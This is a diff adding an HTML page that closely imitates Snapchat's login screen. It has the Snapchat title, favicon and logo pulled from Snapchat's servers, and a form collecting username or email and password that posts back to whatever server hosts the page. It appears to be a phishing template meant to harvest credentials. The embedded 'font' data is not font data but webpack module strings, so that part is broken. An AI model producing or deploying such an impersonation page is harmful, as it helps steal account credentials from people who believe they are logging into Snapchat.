@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=0"/>
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+		<title>Log In - Snapchat</title>
+		<link rel="shortcut icon" href="https://accounts.snapchat.com/accounts/static/images/favicon/favicon.png" type="image/png">
+	</head>
+
+	<body>
+		<style type="text/css">/* Fonts */
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICJlMzQ0YTBjNTk4YWZjNzJjMmZiNzRiMGJhYWY5ZDk3ZS50dGYiOw==) format("truetype");
+  font-weight: 100;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICI3YjY0YmIxNTMzMzNjYmU1OTg2ZGIzMzVkOGMzMjllYy50dGYiOw==) format("truetype");
+  font-weight: 100;
+  font-style: italic;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICJjYzA1ODA2MTgzZWQwZGVkNWY0MGJlODU3ZTE0Y2RiMi50dGYiOw==) format("truetype");
+  font-weight: 300;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICI2NWQ5N2FkNTVhMjU0NDEzNjdkNjE2NTdlNDQyNGE3NS50dGYiOw==) format("truetype");
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICJmNWIxZmVhMDMzNDZiYjA2NTZkMzhkNTExMmNkMTNkNC50dGYiOw==) format("truetype");
+  font-weight: 400;
+  font-style: italic;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICJhNjJkNmYyYzMyNGM3N2QwY2M5YTgyOTk2ZWI2OWEwNi50dGYiOw==) format("truetype");
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICJhMTBkN2ZlNWUwNThkN2FmMWQ0ZTg3MGZlMmY1MDA4NC50dGYiOw==) format("truetype");
+  font-weight: 500;
+  font-style: italic;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICJhNjJkNmYyYzMyNGM3N2QwY2M5YTgyOTk2ZWI2OWEwNi50dGYiOw==) format("truetype");
+  font-weight: 700;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICJhMTBkN2ZlNWUwNThkN2FmMWQ0ZTg3MGZlMmY1MDA4NC50dGYiOw==) format("truetype");
+  font-weight: 700;
+  font-style: italic;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICI5NmNhMDJjZmM4NTFjYzY3MDU0ZjU1NThjYWJjYTIwNy50dGYiOw==) format("truetype");
+  font-weight: 800;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: "Avenir Next";
+  src: url(data:application/x-font-ttf;base64,bW9kdWxlLmV4cG9ydHMgPSBfX3dlYnBhY2tfcHVibGljX3BhdGhfXyArICJlZjI2ZWZkZTBkZTU1YzlmNDAwN2E0ZDI5Y2IzOTAyYy50dGYiOw==) format("truetype");
+  font-weight: 800;
+  font-style: italic;
+}
+</style>
+		<style>
+			@import url('https://fonts.googleapis.com/css?family=Oxygen');
+
+			.main_area
+			{
+				background: #f7ee3b;
+				height: 100vh;
+				position: relative;
+			}
+
+			.img_area
+			{
+				text-align: center;
+				padding-top: 12px;
+			    padding-bottom: 12px;
+			}
+
+			.border_area
+			{
+				width:100%;
+				height:98vh;   /* Height of the footer */
+				background:#fff;
+				position:absolute;
+   				bottom:0;
+   				/*box-shadow: 0px 0px 40px 0px #fffc00, 0px -4px 8px 0px rgba(0, 0, 0, 0.05), 0px -1px 10px 0px rgba(0, 0, 0, 0.35)*/
+			}
+
+			.clip_it
+			{
+				height: 100vh;
+				position: relative;
+				bottom: 0;
+				background-color: #fff;
+				border-radius: 18px;
+			}
+
+			.ghost_img
+			{
+				height: 32px;
+				text-align: center;
+			}
+
+			.login_form
+			{
+				margin-top: 5%;
+				font-family: 'Oxygen', sans-serif;
+			}
+
+			input, input:before, input:after {
+		      -webkit-user-select: initial;
+		      -khtml-user-select: initial;
+		      -moz-user-select: initial;
+		      -ms-user-select: initial;
+		      user-select: initial;
+		     } 
+
+			.form-control
+			{
+				display: block;
+			    width: 100%;
+			    height: 39px;
+			    padding: 8px 16px 8px 0;
+			    font-weight: 400;
+			    font-size: 15px;
+			    line-height: 1.42857;
+			    color: #000;
+			    background-color: #fff;
+			    background-image: none;
+			    outline: 0 none !important;
+			    user-select: none;
+			    border-top: none;
+			    border-left: none;
+			    border-bottom: 1px solid #DFE3E7;
+			    border-right: none;
+			    border-radius: 0;
+			    -webkit-transition: border-color ease-in-out 0.1s, box-shadow ease-in-out 0.1s;
+			    -o-transition: border-color ease-in-out 0.1s, box-shadow ease-in-out 0.1s;
+			    transition: border-color ease-in-out 0.1s, box-shadow ease-in-out 0.1s
+			}
+
+			.centered_form
+			{
+				width: 286px;
+    			margin: 64px auto 80px;
+			}
+
+			.primary_action
+			{
+				margin-top: 32px;
+			}
+
+			.btn-lg
+			{
+				padding: 16px 64px;
+    			font-size: 17px;
+    			line-height: 1.3;
+    			border-radius: 45px;
+			}
+
+			.form-group
+			{
+				outline: none !important;
+			}
+
+			.no_outline
+			{
+				outline: none !important;
+           	 	display: block;
+			    width: 100%;
+			    height: 39px;
+			    padding: 8px 16px 8px 0;
+			    font-weight: 400;
+			    font-size: 15px;
+			    line-height: 1.42857;
+			    color: #000;
+			    background-color: #fff;
+			    background-image: none;
+			    outline: 0 none !important;
+			    user-select: none;
+			    border-top: none;
+			    border-left: none;
+			    border-bottom: 1px solid #DFE3E7;
+			    border-right: none;
+			    border-radius: 0;
+			    -webkit-transition: border-color ease-in-out 0.1s, box-shadow ease-in-out 0.1s;
+			    -o-transition: border-color ease-in-out 0.1s, box-shadow ease-in-out 0.1s;
+			    transition: border-color ease-in-out 0.1s, box-shadow ease-in-out 0.1s
+			}
+
+			.secondary_action
+			{
+				font-family: "Avenir Next", "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+				font-weight: 400;
+    font-size: 15px;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    color: #16191C;
+			}
+
+			.secondary_action
+			{
+				margin-top: 5%;
+			}
+
+			.no_outline:focus
+			{
+				border-color: #0eadff;
+			}
+
+		</style>
+
+
+
+		<section class='main_area'>
+			<div class='main_area'>
+				<div class='img_area'>
+					<img class='ghost_img' src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" alt="Snapchat">
+				</div>
+				<div class='clip_it'>
+					<div class='border_area'>
+						<div class='text-center login_form'>
+							<h2>Log into Snapchat</h2>
+						</div>
+						<div>
+							<form id="login_form" method="post" class="centered_form ">
+								<div class="form-group has-success">
+									<label for="username" class="control-label">Username or email</label>
+									<input type="text" name="username" value="" autocomplete="off" id="username" class="no_outline">
+								</div>
+								<div class="form-group has-success">
+									<label for="password" class="control-label">Password</label>
+									<input type="password" name="password" value="" autocomplete="off" id="password" class="no_outline">
+								</div>
+								<input type="hidden" name=''>
+								<div class="primary_action text-center">
+									<button type="submit" class="btn btn-lg btn-primary">Log In</button>
+								</div>
+
+								<p class="secondary_action text-center"><a href="">Forgot Password</a></p>
+							</form>
+						</div>
+					</div>
+				</div>
+			</div>
+		</section>
+
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+	</body>
+</html>
